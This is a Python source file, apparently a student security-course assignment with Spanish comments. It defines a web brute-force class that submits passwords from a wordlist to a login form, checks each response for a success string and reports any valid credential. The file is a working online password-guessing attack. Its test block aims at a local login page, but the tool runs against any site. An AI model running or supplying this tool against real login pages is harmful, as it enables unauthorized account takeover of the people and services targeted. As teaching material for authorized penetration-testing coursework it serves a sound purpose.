import datetime
import requests
from typing import Dict, Any, List

class WebBruteForcer:
    """
    El Grupo 4 se encargada de realizar ataques de fuerza bruta automatizados
    """
    def __init__(self, target_url: str, username_field: str, password_field: str, success_indicator: str):
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
        self.success_indicator = success_indicator
        self.session = requests.Session()  # Manejo de sesiones para cookies

    def execute_attack(self, target_user: str, wordlist: List[str]) -> Dict[str, Any]:
        """
        Ejecuta el ataque recorriendo la lista de contraseñas.
        Devuelve el diccionario estandarizado para el reporte final.
        """
        resultado = {
            "modulo": "Fuerza Bruta Web",
            "grupo": 4,
            "estudiante": "Andrés Maldonado",
            "target": self.target_url,
            "timestamp": datetime.datetime.now().isoformat(),
            "status": "success",
            "data": {},
            "error_message": None
        }

        intentos_realizados = []
        credencial_encontrada = None

        try:
            print(f"\n[G4] Iniciando Fuerza Bruta Web en: {self.target_url}")
            print(f"[G4] Evaluando usuario: '{target_user}' con {len(wordlist)} contraseñas.")

            for password in wordlist:
                # Diccionario con los campos de datos que espera el formulario HTML
                payload = {
                    self.username_field: target_user,
                    self.password_field: password
                }

                # Enviamos la petición POST con los datos encapsulados en el cuerpo
                response = self.session.post(self.target_url, data=payload, timeout=3.0)
                
                intentos_realizados.append({
                    "usuario": target_user,
                    "password": password,
                    "status_code": response.status_code
                })

                # Analizamos el HTML de la respuesta buscando el Indicador de Éxito
                if self.success_indicator in response.text:
                    credencial_encontrada = {
                        "usuario": target_user,
                        "password": password
                    }
                    print(f"[+] ¡ÉXITO! Credencial válida encontrada: {target_user}:{password}")
                    break  # Detiene el ataque al acertar

            resultado["data"] = {
                "total_intentos": len(intentos_realizados),
                "intentos": intentos_realizados,
                "exitoso": credencial_encontrada is not None,
                "credencial_valida": credencial_encontrada
            }

        except Exception as e:
            resultado["status"] = "error"
            resultado["error_message"] = f"Error en la ejecución: {str(e)}"

        return resultado

# Bloque de prueba local autónomo
if __name__ == "__main__":
    import json
    print("[*] Ejecutando prueba local autónoma...")
    attacker = WebBruteForcer(
        target_url="http://127.0.0.1:8080/login.php",
        username_field="username",
        password_field="password",
        success_indicator="Welcome"
    )
    print(json.dumps(attacker.execute_attack("admin", ["123", "admin2026"]), indent=4))